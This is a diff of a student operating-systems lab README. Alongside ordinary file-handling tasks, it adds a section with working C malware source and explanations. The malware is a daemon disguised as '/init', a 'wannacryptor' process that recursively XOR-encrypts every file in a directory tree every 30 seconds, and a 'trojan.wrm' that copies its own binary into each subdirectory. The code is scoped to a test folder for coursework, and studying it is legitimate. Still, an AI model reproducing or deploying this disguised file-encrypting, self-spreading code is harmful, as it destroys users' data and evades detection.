@@ -1,6 +1,6 @@
 # Sisop-2-2025-IT05
 
-below is the template
+Here is the official report for our, IT05 group, work.
 
 # Soal_1
 
@@ -19,13 +19,13 @@ this is the c code library for soal_1
 ## Sub Soal a
 
 Command: 
-```bash 
+```c  
 ./action
 ```
 
 
 Code:
-```bash
+```c 
 void setupClues() {
     
     struct stat st = {0};
@@ -70,13 +70,13 @@ Output:
 ## Sub Soal b
 
 Command:
-```bash 
+```c  
 ./action -m Filter
 ```
 
 
 Code:
-```bash
+```c 
 int isValidFileName(const char *filename) {
     char name[256];
     strncpy(name, filename, sizeof(name) - 1);
@@ -93,7 +93,7 @@ Checks if the file name (excluding extension) is exactly one character long and 
 This function is used during the filtering process to validate which files are kept or deleted.
 
 
-```bash
+```c 
 void filterFiles(const char *sourceFolder) {
     DIR *dir = opendir(sourceFolder);
     if (!dir) {
@@ -145,11 +145,11 @@ Output:
 
 ### Sub Soal c
 Command:
-```bash
+```c 
 ./action -m Combine
 ```
 
-```bash
+```c 
 int cmpstr(const void *a, const void *b) {
     return strcmp(*(char **)a, *(char **)b);
 }
@@ -161,7 +161,7 @@ This ensures consistent ordering when combining files in the next step.
 
 
 Code:
-```bash
+```c 
 void combineFiles(const char *folderPath) {
     DIR *dir = opendir(folderPath);
     if (!dir) {
@@ -201,7 +201,7 @@ Task C: This part merges the content of all filtered clue files into one output 
 It separates files into two groups: those starting with digits and those starting with letters.
 
 
-```bash
+```c 
 for (int i = 0; i < na || i < nh; i++) {
         char *files[2] = { i < na ? angka[i] : NULL, i < nh ? huruf[i] : NULL };
 
@@ -239,13 +239,13 @@ Output:
 ## Sub Soal d
 
 Command :
-```bash
+```c 
 ./action -m Decode
 ```
 
 
 Code:
-```bash
+```c 
 void decodeRot13(const char *inputFile, const char *outputFile) {
     FILE *input = fopen(inputFile, "r");
     if (!input) {
@@ -286,7 +286,7 @@ Output:
 
 
 ### Main Function 
-```bash
+```c 
 int main(int argc, char *argv[]) {
     if (argc == 1) {
         setupClues();
@@ -333,7 +333,7 @@ If the argument doesn't match any known option, it prints usage instructions. (E
 
 # Soal_2
 
-```bash
+```c 
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/types.h>
@@ -349,7 +349,7 @@ If the argument doesn't match any known option, it prints usage instructions. (E
 ```
 this is the c code library for soal_2
 
-```bash
+```c 
 
 #define SIZE 4096
 pid_t decrypt_pid = -1;
@@ -361,12 +361,12 @@ Defines SIZE as 4096 for buffer size and declares a global PID for the decrypt d
 ## Sub Soal a
 
 Command: 
-```bash
+```c 
  ./starterkit
 ```
 
 Code:
-```bash
+```c 
 void setup() {
     pid_t child1, child2, child3;
 
@@ -410,12 +410,12 @@ Output:
 ### Sub Soal b
 
 Command :
-```bash
+```c 
 ./starterkit --decrypt
 ```
 
 Code:
-```bash
+```c 
 int is_base64(const char *str) {
     int len = strlen(str); 
     if (len % 4 != 0) return 0; 
@@ -439,7 +439,7 @@ checks if the file name is base64
 
 
 Code:
-```bash
+```c 
 void decrypt() {
     pid_t pid, sid;
     pid = fork();
@@ -537,13 +537,13 @@ Output:
 ### Sub Soal c
 
 Command :
-```bash
+```c 
 ./starterkit --quarantine
 ```
 
 
 Code:
-```bash 
+```c  
 void quarantineFiles() {
     DIR *dir = opendir("starter_kit");
     struct dirent *entry;
@@ -575,13 +575,13 @@ Output:
 
 
 Command :
-```bash
+```c 
 ./starterkit --return
 ```
 
 
 Code:
-```bash
+```c 
 void returnFiles() {
     DIR *dir = opendir("quarantine");
     struct dirent *entry;
@@ -614,13 +614,13 @@ Output:
 ### Sub Soal d
 
 Command :
-```bash
+```c 
 ./starterkit --eradicate
 ```
 
 
 Code:
-```bash
+```c 
 void eradicate() {
     DIR *dir = opendir("quarantine");
     struct dirent *entry;
@@ -652,13 +652,13 @@ Output:
 ### Sub Soal e
 
 Command :
-```bash
+```c 
 ./starterkit --shutdown
 ```
 
 
 Code:
-```bash
+```c 
         else if (strcmp(argv[1], "--shutdown") == 0) {
         FILE *pid_file = fopen("decrypt.pid", "r");
             if (pid_file == NULL) {
@@ -696,7 +696,7 @@ Output:
 #### Error Handling
 
 Code:
-```bash
+```c 
 else {
             printf("Error.\n");
             printf("Use:\n");
@@ -718,7 +718,7 @@ Output:
 ### Sub Soal g
 
 Code:
-```bash
+```c 
 void Log(const char* message) {
     FILE *logFile = fopen("activity.log", "a"); //buat file dgn mode append
     if (logFile == NULL) return;
@@ -745,7 +745,7 @@ Output:
 
 ### Main Function
 
-```bash
+```c 
 int main(int argc, char *argv[]) {
     if (argc > 1) {
         if (strcmp(argv[1], "--decrypt") == 0) {
@@ -814,34 +814,512 @@ If no arguments are given, it runs the setup() function automatically.
 #### Sub soal b
  Before revision, in sub-question **b** (**decrypt** function), when a new Base64-encoded file was added to the `quarantine` folder, the file was not immediately decoded. Therefore, code was added to check the `quarantine` folder — if there are any files that haven't been decoded yet, they will be decoded.
 
-
 # Soal_3
 
-## Sub Soal
+## Sub Soal a
 
-Command: 
+### Objective
 
-```bash
-command line to activate the script
+Make a **daemon** process that can change their process name into "**/init**'. 
+
+Block of Code that is running:
+
+```c 
+int main(int argc, char *argv[]) {
+  // declaration: id process
+  pid_t pid, sid; 
+  pid = fork();
+  if (pid < 0) { // check: fork failure
+    log_error("Fork failed: %s", strerror(errno));
+    exit(EXIT_FAILURE);
+  }
+  
+  if (pid > 0) { // check: fork parent success
+    exit(EXIT_SUCCESS);
+  }
+  
+  // allowing the child to run in the background
+  umask(0);
+  
+  // separate from terminal 
+  sid = setsid();
+  if (sid < 0) { // check: setsid failure
+    log_error("setsid failed: %s", strerror(errno));
+    exit(EXIT_FAILURE);
+  }
+  
+  // change working directory
+  if ((chdir("/")) < 0) {
+    exit(EXIT_FAILURE);
+  }
+  
+  // close standard file descriptors
+  close(STDIN_FILENO);
+  close(STDOUT_FILENO);
+  close(STDERR_FILENO);
+  
+  // changing the command name
+  if (pid == 0) {
+    strncpy(argv[0], "/init1", 50); // init1 temporarily for testing
+    argv[0][50] = '\0'; // ensure null termination
+    set_process_name("/init");
+  }
+
+  // daemon process loop
+  while (1) {
+    sleep(1);
+  }
+  
+  return 0;
+}
 ```
 
 Output: 
 
 ![output_example](assets/temp.txt)
 
+#### Explanation
+
+Changing the process name of daemon into /init (in the implementation is init1 so it can be discovered easier)
+
+```c  
+// function: helper to set name
+void set_process_name(const char *name) {
+  prctl(PR_SET_NAME, name, NULL, NULL, NULL);
+}
+
+int main(int argc, char *argv[]) {
+  // changing the command name
+  if (pid == 0) {
+    strncpy(argv[0], "/init1", 50); // init1 temporarily for testing
+    argv[0][50] = '\0'; // ensure null termination
+    set_process_name("/init");
+  } 
+}
+```
+
+* The main function is made to have a parameter argv as string.  
+This is made so it can rename the daemon process into "/init1".  
+By using the `strncpy(argv[0], "/init1", 50);` the process is changed into "/init1" by changing the first argument of the process (`argv[0]`).
+* `set_process_name("/init");` is to change the process name in the kernel.  
+This just use the `prctl()` function defined in `<sys/prctl.h>` library.  
+`prctl()` function can rename the process, but in the kernel.
+
+## Sub Soal b 
+
+#### Objective
+
+Make an encryptor child process with the name: "**wannacryptor**"; that can **scan the current directory** and **encrypt all files** inside the directory using **XOR** operation by the **timestamp** acquired from the current time of the first time process running.
+
 Block of Code that is running:
 
-```bash
-block of code
+```c
+// function: encrypt files using XOR cipher
+void xor_encrypt(const char *input_path, int key) {
+  FILE *input_file = fopen(input_path, "rb+");
+  if (!input_file) { // check: file open failure
+    log_error("Failed to open file: %s (%s)", input_path, strerror(errno));
+    return;
+  }
+
+  int ch; 
+  while ((ch = fgetc(input_file)) != EOF) {
+    fseek(input_file, -1, SEEK_CUR);
+    fputc(ch ^ key, input_file);
+    fflush(input_file);
+  }
+
+  fclose(input_file);
+}
+
+// function: encrypt directory and its contents
+void encrypt_dir(const char *path, int key) {
+  DIR *dir = opendir(path);
+  if (!dir) {
+    log_error("Failed to open directory: %s (%s)", path, strerror(errno));
+    return;
+  }
+
+  struct dirent *entry;
+  while ((entry = readdir(dir)) != NULL) {
+    if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
+      continue; // Skip current and parent directories
+    }
+
+    char full_path[1024];
+    snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
+
+    if (entry->d_type == DT_DIR) {
+      // If it's a directory, recursively encrypt it
+      encrypt_dir(full_path, key);
+    } else if (entry->d_type == DT_REG) {
+      // If it's a regular file, encrypt it
+      xor_encrypt(full_path, key);
+    }
+
+  }
+  closedir(dir);
+}
+
+int main(int argc, char *argv[]) {
+  // first feature
+  pid_t wannacryptor_pid = fork();
+  if (wannacryptor_pid == 0) {
+      set_process_name("wannacryptor");
+      while (1) {
+          time_t timestamp = time(NULL);
+          encrypt_dir(home, (int)(timestamp % 256));
+          fprintf(log_file, "Encryption performed at %ld\n", timestamp);
+          fflush(log_file);
+          sleep(30);
+      }
+    } else if (wannacryptor_pid < 0) {
+      log_error("Fork failed for wannacryptor: %s", strerror(errno));
+      exit(EXIT_FAILURE);
+    } 
+  fclose(log_file);
+  return 0; 
+}
 ```
 
-#### Explanation:
+Output: 
 
-```bash 
-block of code
+![output_example](assets/temp.txt)
+
+#### Explanation
+
+To encrypt a file's contents, the below function is used:
+
+```c
+void xor_encrypt(const char *input_path, int key) {
+  FILE *input_file = fopen(input_path, "rb+");
+  if (!input_file) { // check: file open failure
+    log_error("Failed to open file: %s (%s)", input_path, strerror(errno));
+    return;
+  }
+
+  int ch; 
+  while ((ch = fgetc(input_file)) != EOF) {
+    fseek(input_file, -1, SEEK_CUR);
+    fputc(ch ^ key, input_file);
+    fflush(input_file);
+  }
+
+  fclose(input_file);
+}
 ```
 
-The line above means that you need to figure out the whole thing on your own. So, good luck on whoever is trying to figure out what that line is for. For whoever that's trying to find the explanation here, you are out of luck, 'cuz this README.md is absolutely of no use for that reason.
+* `const char *input_path` is the path to the file that want to be encrypted.
+* `int key` is the timestamp that the encryption will be based on.
+* `FILE *input_file = fopen(input_path, "rb+");` is to open a file that is already exsting in the directory path to be read and write into.  
+For the sake of safety measure, there's an IF statement so to make sure the success of opening the file. If unsuccessful it will be noted in the log file.  
+* `while ((ch = fgetc(input_file)) != EOF)` will loop all of the binary contents of the file for each character until it reaches the `EOF`.  
+Using the `fgetc()` function to get the binary value of each character in the file that is being read. 
+* `fseek(input_file, -1, SEEK_CUR);` will change the position of character that is being read in the file by `-1`. 
+* `fputc(ch ^ key, input_file);` will overwrite the file in the initial position of the character that has been read at the current iteration that has been encrypted using XOR based on the timestamp that has been given to the function.  
+* `fflush(input_file);` to make sure the operation of writing to file is being executed properly, forcing the operation in buffer to be executed immeediately/emptied to be executed.  
+* `fclose(input_file);` to close the file that is currently being opened to be `rb+` and have been encrypted.  
+
+For encrypting a file's contents, the function above is to be used. But for looping the malware to know every file that is going to be encrypted in the directory path that was given, use:
+
+```c
+void encrypt_dir(const char *path, int key) {
+  DIR *dir = opendir(path);
+  if (!dir) {
+    log_error("Failed to open directory: %s (%s)", path, strerror(errno));
+    return;
+  }
+
+  struct dirent *entry;
+  while ((entry = readdir(dir)) != NULL) {
+    if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
+      continue; // Skip current and parent directories
+    }
+
+    char full_path[1024];
+    snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
+
+    if (entry->d_type == DT_DIR) {
+      // If it's a directory, recursively encrypt it
+      encrypt_dir(full_path, key);
+    } else if (entry->d_type == DT_REG) {
+      // If it's a regular file, encrypt it
+      xor_encrypt(full_path, key);
+    }
+
+  }
+  closedir(dir);
+}
+```
+
+* `const char *path` is the path that leads to the directory which contents will be encrypted. 
+* `int key` is the timestamp where the XOR operation will operate based on
+* `DIR *dir = opendir(path);` to declare and open the directory path as a directory.  
+* `struct dirent *entry;` to declare the `struct dirent` variable so we can know each 'type' of path later on.  
+*  `while ((entry = readdir(dir)) != NULL) {` is a while loop to read each path in the directory as long the path isn't NULL.  
+Below that line there is an IF statement to skip current and parent directory if read.
+* `snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);` to declare a new string (full_path) which is a combination of the original path that is inserted into the function and the path that is being read inside that directory by the function, to form a new path that directs to the file/subdirectory inside the original directory.  
+* The next IF statements will check if the path that is currently being read is a directory or a file.  
+If it's a directory, it will call upon itself (`encrypt_dir()`) to read the directory paths inside the subdirectory.  
+If it's a file, it will call the `xor_encrypt()` to encrypt its contents
+
+After that, call the function in the main fucntion, which is done with below:
+
+```c
+pid_t wannacryptor_pid = fork();
+  if (wannacryptor_pid == 0) {
+      set_process_name("wannacryptor");
+      while (1) {
+          time_t timestamp = time(NULL);
+          encrypt_dir(home, (int)(timestamp % 256));
+          fprintf(log_file, "Encryption performed at %ld\n", timestamp);
+          fflush(log_file);
+          sleep(30);
+      }
+    } else if (wannacryptor_pid < 0) {
+      log_error("Fork failed for wannacryptor: %s", strerror(errno));
+      exit(EXIT_FAILURE);
+    } 
+```
+
+* `wannacryptor_pid = fork()` is to make a child process that is dedicated to call the encryption function.  
+* `set_process_name("wannacryptor");` to set the process name as "wannacryptor" in kernel.
+* `while(1)` is a while loop to make the child process can always run.
+* `time_t timestamp = time(NULL)` to get the current timestamp.
+* `encrypt_dir(home, (int)(timestamp % 256));` is to call the `encrypt_dir()` with the argument of the home directory path leading to `/HOME/[USER]` and the current timestamp as an integer that has been done with the modulo operation with 256.
+* `sleep(30);` is used so the daemon process will do its operation every 30 seconds.
+
+
+## Sub Soal c 
+
+#### Objective
+
+Make a **trojan.wrm** that **spreads the runnable file** (binary file) of the malware into the `/HOME/[USER]` directory.
+
+Code block that is running:
+
+```c
+// function: spread malware to directories
+void spread_malw(const char *source_path, const char *target_dir) {
+  DIR *dir = opendir(target_dir);
+  if (!dir) {
+    log_error("Failed to open target directory: %s (%s)", target_dir, strerror(errno));
+    return;
+  }
+
+  struct dirent *entry; 
+  while ((entry = readdir(dir)) != NULL) {
+    if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
+      continue; // Skip current and parent directories
+    }
+
+    char full_path[1024];
+    snprintf(full_path, sizeof(full_path), "%s/%s", target_dir, entry->d_name);
+
+    if (entry->d_type == DT_DIR) {
+      char new_path[1024]; 
+      snprintf(new_path, sizeof(new_path), "%s/malware_copy", full_path);
+      /* char command[2048]; 
+      snprintf(command, sizeof(command), "cp -f '%s' '%s/malware_copy'", source_path, full_path);
+      system(command);  */
+
+      // make the new directory 
+      if (mkdir(new_path, 0755) == -1) {
+        if (errno != EEXIST) { 
+            log_error("Failed to create directory %s: %s", new_path, strerror (errno));
+            continue;
+          }
+      }
+
+      char dest_file[2048];
+      snprintf(dest_file, sizeof(dest_file), "%s/malware", new_path);
+
+      pid_t pid = fork();
+      if (pid < 0) { // check: fork failure
+        log_error("Fork failed: %s", strerror(errno));
+        // perror("Failed to fork process");
+        continue;
+      } else if (pid == 0) { // child process
+        // execute cp command
+        execlp("cp", "cp", "-f", "--preserve=all", source_path, new_path, NULL);
+        // if failed
+        log_error("execlp failed: %s (Src: %s -> Dest: %s)", strerror(errno), source_path, new_path);
+        exit(EXIT_FAILURE);
+      } else { // parent process
+        waitpid(pid, NULL, 0);; // wait for child process to finish
+      }
+    }
+  }
+  closedir(dir);
+}
+
+int main(int argc, char *argv[]) {
+    // getting the path to runme
+  char self_path[1024];
+  ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
+  if (len == -1) {
+    log_error("Failed to get executable path: %s", strerror(errno));
+    exit(EXIT_FAILURE);
+  }
+  self_path[len] = '\0'; // null-terminate the string
+  
+  // getting the home directory
+  char *env_home = getenv("HOME");
+  if (env_home == NULL) {
+    log_error("Failed to get HOME environment variable: %s", strerror(errno));
+    exit(EXIT_FAILURE);
+  }
+  
+  char home[1024];  // buffer final
+  // strncpy(home, env_home, sizeof(home));
+  snprintf(home, sizeof(home), "%s/malwareTest", env_home);
+  home[sizeof(home) - 1] = '\0'; // null-termination safety
+
+  // second feature
+  pid_t trojan_pid = fork();
+  if (trojan_pid == 0) {
+      set_process_name("trojan.wrm");
+      while (1) {
+          spread_malw(self_path, home);
+          sleep(30);
+      }
+  } else if (trojan_pid < 0) {
+      log_error("Fork failed for trojan: %s", strerror(errno));
+      exit(EXIT_FAILURE);
+  }
+
+  while (1) {
+    sleep(1);
+  }
+  
+  return 0;
+}
+```
+
+Output: 
+
+![output_example](assets/temp.txt)
+
+#### Explanation
+
+For trojan.wrm to work, we need to find the runnable file's and the `/HOME/[USER]` directory path. To be able to do that, we use the below: 
+
+```c
+char self_path[1024];
+  ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
+  if (len == -1) {
+    log_error("Failed to get executable path: %s", strerror(errno));
+    exit(EXIT_FAILURE);
+  }
+  self_path[len] = '\0';
+```
+
+* `readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);` can find the runnable file's path using `/proc/self/exe` link and `readlink()` to use that link and copy the path into `self-path`.  
+* The lines below that is just an IF statement for if the path isn't found.
+
+```c
+char *env_home = getenv("HOME");
+  if (env_home == NULL) {
+    log_error("Failed to get HOME environment variable: %s", strerror(errno));
+    exit(EXIT_FAILURE);
+  }
+  
+  char home[1024];  // buffer final
+  // strncpy(home, env_home, sizeof(home));
+  snprintf(home, sizeof(home), "%s/malwareTest", env_home);
+  home[sizeof(home) - 1] = '\0';
+
+```
+
+* `env_home = getenv("HOME")` to get the HOME path of the user that is running the malware.
+* `snprintf(home, sizeof(home), "%s/malwareTest", env_home);` is for adding the `/malwareTest` path so it's safe to be run for testing purposes.
+
+Next step is to call the main function that spreads the malware (`spread_malw()`) in the main function. 
+
+```c 
+pid_t trojan_pid = fork();
+  if (trojan_pid == 0) {
+      set_process_name("trojan.wrm");
+      while (1) {
+          spread_malw(self_path, home);
+          sleep(30);
+      }
+  } else if (trojan_pid < 0) {
+      log_error("Fork failed for trojan: %s", strerror(errno));
+      exit(EXIT_FAILURE);
+  }
+```
+
+* `trojan_pid = fork()` to make a child process dedicated to spread the malware.
+* `set_process_name("trojan.wrm");` to set the process name as "trojan.wrm" in kernal.  
+* `while (1) {` to make sure the child process always run.  
+* `spread_malw(self_path, home);` calls the `spread_malw()` function with the argument of the user's HOME.  
+* `sleep(30)` to make sure the process is run every 30 seconds.  
+
+Meanwhile, here's the main function to spread the malware.
+
+```c
+oid spread_malw(const char *source_path, const char *target_dir) {
+  DIR *dir = opendir(target_dir);
+  if (!dir) {
+    log_error("Failed to open target directory: %s (%s)", target_dir, strerror(errno));
+    return;
+  }
+
+  struct dirent *entry; 
+  while ((entry = readdir(dir)) != NULL) {
+    if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
+      continue; // Skip current and parent directories
+    }
+
+    char full_path[1024];
+    snprintf(full_path, sizeof(full_path), "%s/%s", target_dir, entry->d_name);
+
+    if (entry->d_type == DT_DIR) {
+      char new_path[1024]; 
+      snprintf(new_path, sizeof(new_path), "%s/malware_copy", full_path);
+      /* char command[2048]; 
+      snprintf(command, sizeof(command), "cp -f '%s' '%s/malware_copy'", source_path, full_path);
+      system(command);  */
+
+      // make the new directory 
+      if (mkdir(new_path, 0755) == -1) {
+        if (errno != EEXIST) { 
+            log_error("Failed to create directory %s: %s", new_path, strerror (errno));
+            continue;
+          }
+      }
+
+      char dest_file[2048];
+      snprintf(dest_file, sizeof(dest_file), "%s/malware", new_path);
+
+      pid_t pid = fork();
+      if (pid < 0) { // check: fork failure
+        log_error("Fork failed: %s", strerror(errno));
+        // perror("Failed to fork process");
+        continue;
+      } else if (pid == 0) { // child process
+        // execute cp command
+        execlp("cp", "cp", "-f", "--preserve=all", source_path, new_path, NULL);
+        // if failed
+        log_error("execlp failed: %s (Src: %s -> Dest: %s)", strerror(errno), source_path, new_path);
+        exit(EXIT_FAILURE);
+      } else { // parent process
+        waitpid(pid, NULL, 0);; // wait for child process to finish
+      }
+    }
+  }
+  closedir(dir);
+}
+```
+
+* `const char *source_path` is the directory path leading to the runnable file's path.  
+* `const char *target_dir` is the directory path leading to user's HOME path.  
+* `DIR *dir = opendir(target_dir);` to declare and open the directory path of the user's HOME path.  
+* `struct dirent *entry;` to delcare each entry in the directory path, which will later be used on to scan each file/subdirectory in the directory.
+* 
+
+
 
 # Soal_4
 
@@ -849,7 +1327,7 @@ The line above means that you need to figure out the whole thing on your own. So
 
 Command: 
 
-```bash
+```c 
 command line to activate the script
 ```
 
@@ -859,13 +1337,13 @@ Output:
 
 Block of Code that is running:
 
-```bash
+```c 
 block of code
 ```
 
 #### Explanation:
 
-```bash 
+```c  
 block of code
 ```
 
